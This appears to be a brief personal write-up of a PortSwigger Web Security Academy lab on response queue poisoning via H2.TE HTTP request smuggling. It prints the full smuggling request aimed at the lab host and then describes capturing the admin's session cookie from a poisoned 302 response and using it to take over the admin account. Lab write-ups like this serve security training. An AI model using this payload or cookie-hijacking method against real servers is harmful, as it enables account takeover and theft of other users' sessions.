# [Response queue poisoning via H2.TE request smuggling] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-26
 
---
 
## Vulnerability / core concept
HTTP Request Smuggling

---


## Payload / key command
```bash
POST / HTTP/2
Host: 0a1f000b03cd238280893f2200bf003f.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 91

0

GET /404 HTTP/1.1
Host: 0a1f000b03cd238280893f2200bf003f.web-security-academy.net

```
Sending this request will poison requets queue and we will be able to access arbitrary responses from other users. In this lab we can poison request until we get 302 Found response from admin during loggin in and catch admin's session cookie. Then we change it in Storage in browser using developer tools and reload page. Now we can access admin account and delete user carlos.


